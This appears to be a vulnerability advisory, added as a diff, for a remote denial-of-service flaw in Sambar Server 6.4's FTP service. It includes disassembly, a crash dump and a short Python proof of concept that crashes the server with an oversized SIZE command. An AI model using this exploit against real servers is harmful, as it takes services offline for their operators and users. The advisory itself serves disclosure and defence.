@@ -1,0 +1,113 @@
+Sambar Technologies All-In-One Server Remote Denial of Service
+
+
+Delivery:           Undisclosed
+
+Severity:           Medium/High
+
+Time line:          2006-01-26 Discovery
+
+Software affected:  Sambar v6.4 and earlier - all platforms.
+
+                    Tested on:
+                    * Sambar v6.4 (Windows - Version 5.1.2600)
+
+Vendor:             http://s3.amazonaws.com/sambar64/sambar643p.exe
+
+Author:             Christoph Diehl <posidron@xophdware.com>
+
+
+I. BACKGROUND
+
+Sambar Technologies is a leading provider of website, email, instant
+messaging, and document management tools for organizations and
+individuals. The Sambar Server is used by thousands of businesses,
+schools, service providers and individuals around the world to enhance
+communication and collaboration. From web, email and IM, to document
+management and application sharing, the Sambar Server supports it all
+from one proven, reliable platform.
+
+
+
+II. DESCRIPTION
+
+The FTP service is vulnerable by sending a special crafted SIZE command,
+with a single special character, thus results in a complete application
+shutdown after the exception in the FTP service occured.
+
+
+
+III. DETAILS
+
+Syntax: SIZE remote-filename
+
+1008DAE7  call    sambar._ftp_validname      ; \_ftp_validname
+1008DAEC  add     esp, 10
+1008DAEF  movsx   edx, ax
+1008DAF2  cmp     edx, 1
+1008DAF5  je      short sambar.1008DB4E
+1008DAF7  mov     eax, [arg.2]
+1008DAFA  push    eax
+1008DAFB  push    sambar.10254D4C            ;  ASCII "550 Can't access %s. Invalid characters in name.\r\n"
+1008DB00  push    400
+1008DB05  lea     ecx, [local.68]
+1008DB0B  push    ecx
+1008DB0C  call    sambar._cm_snprintf        ;  jmp to sambarcm.cm_snprintf
+1008DB11  add     esp, 10
+1008DB14  push    1
+1008DB16  push    -3
+1008DB18  lea     edx, [local.68]
+1008DB1E  push    edx
+1008DB1F  mov     eax, [arg.1]
+1008DB22  mov     ecx, dword ptr ds:[eax+4C] ; <= CRASH
+1008DB25  push    ecx
+1008DB26  mov     edx, [arg.1]
+1008DB29  mov     eax, dword ptr ds:[edx+58]
+1008DB2C  push    eax
+1008DB2D  call    sambar._cm_net_putdata     ;  jmp to sambarcm.cm_net_putdata
+
+EAX 696C6176
+ECX 00000133
+EDX 018CE7F0 ASCII "550 Can't access c:\\AAAAAAAAAAAAAAA<snip>::::::
+EBX 00000000
+ESP 018CE7C0
+EBP 018CE900 ASCII "::::. Invalid characters in name.\r\n"
+ESI 00D95F80
+EDI 00CF3898
+EIP 1008DB22 sambar.1008DB22
+
+
+SambarCrash.dbg
+//=====================================================
+Exception code: C0000005 ACCESS_VIOLATION
+OS-Version: 5.1.2600 (Service Pack 2)
+Fault address:  1008DB22 01:0008CB22 C:\sambar64\bin\sambar.dll
+
+
+
+IV. PROOF OF CONCEPT
+
+# -*- coding: ISO-8859-1 -*-
+import socket, time
+
+payload = "SIZE "+":"*512
+
+print "Sending payload:",
+SambarSocket = socket.socket()
+SambarSocket.connect(("127.0.0.1", 21))
+SambarSocket.send("USER test\r\n")
+SambarSocket.send("PASS test\r\n")
+SambarSocket.send(payload+"\r\n")
+SambarSocket.close()
+print "Done."
+
+time.sleep(1)
+
+print "Checking only FTP service:",
+CheckSocket = socket.socket()
+try:
+    CheckSocket.connect(("127.0.0.1", 21))
+except socket.error:
+    print "All services are down!"
+else:
+    print "Running."
